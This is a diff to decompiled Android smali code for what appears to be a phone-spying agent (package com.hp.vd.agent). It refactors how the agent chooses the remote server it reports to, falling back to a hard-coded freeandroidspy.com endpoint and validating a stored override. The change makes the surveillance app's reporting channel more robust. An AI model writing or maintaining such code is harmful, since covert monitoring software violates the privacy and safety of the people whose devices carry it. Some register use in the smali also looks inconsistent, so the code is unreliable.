@@ -3,6 +3,12 @@
 .source "Configuration.java"
 
 
+# static fields
+.field public static final DEFAULT_ENDPOINT:Ljava/lang/String; = "https://server.freeandroidspy.com:443/index.php"
+
+.field public static final PREF_KEY_ENDPOINT:Ljava/lang/String; = "server_endpoint"
+
+
 # instance fields
 .field protected defaultHeartbeatInterval:I
 
@@ -73,14 +79,22 @@
 .end method
 
 .method public getEndpoints(Landroid/content/Context;)[Ljava/net/URI;
-    .locals 6
+    .locals 7
 
     const/4 v0, 0x1
 
     .line 173
     new-array v0, v0, [Ljava/net/URI;
 
-    const-string v1, "https://server.freeandroidspy.com:443/index.php"
+    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;
+
+    const/4 v2, 0x0
+
+    if-eqz p1, :cond_1
+
+    const-string v3, "system"
+
+    const/4 v4, 0x0
 
     const/4 v2, 0x0
 
@@ -95,39 +109,52 @@
 
     move-result-object v3
 
-    if-eqz v3, :cond_2
+    if-eqz v3, :cond_1
 
-    const-string v5, "server_endpoint"
+    sget-object v4, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;
 
-    invoke-interface {v3, v5}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z
+    const-string v5, ""
 
-    move-result v4
-
-    if-eqz v4, :cond_2
-
-    const-string v4, ""
-
-    invoke-interface {v3, v5, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object v3
 
-    if-eqz v3, :cond_2
+    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object v3
 
     invoke-virtual {v3}, Ljava/lang/String;->length()I
 
     move-result v4
 
-    if-lez v4, :cond_2
+    if-lez v4, :cond_1
 
     move-object v1, v3
 
-    :cond_2
+    :cond_1
+    :try_start_0
+    invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;
+
+    move-result-object v3
+    :try_end_0
+    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
+
+    aput-object v3, v0, v2
+
+    goto :goto_0
+
+    :catch_0
+    move-exception v3
+
+    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;
+
     invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;
 
     move-result-object v1
 
     aput-object v1, v0, v2
 
+    :goto_0
     return-object v0
 .end method
 
@@ -325,9 +352,9 @@
 
     iput-object v1, v0, Lcom/hp/vd/data/SystemData;->session:Ljava/lang/String;
 
-    const-string v1, "https://server.freeandroidspy.com:443/index.php"
+    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;
 
-    const-string v2, "server_endpoint"
+    sget-object v2, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;
 
     const-string v3, ""
 
@@ -335,7 +362,9 @@
 
     move-result-object v2
 
-    if-eqz v2, :cond_2
+    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object v2
 
     invoke-virtual {v2}, Ljava/lang/String;->length()I
 
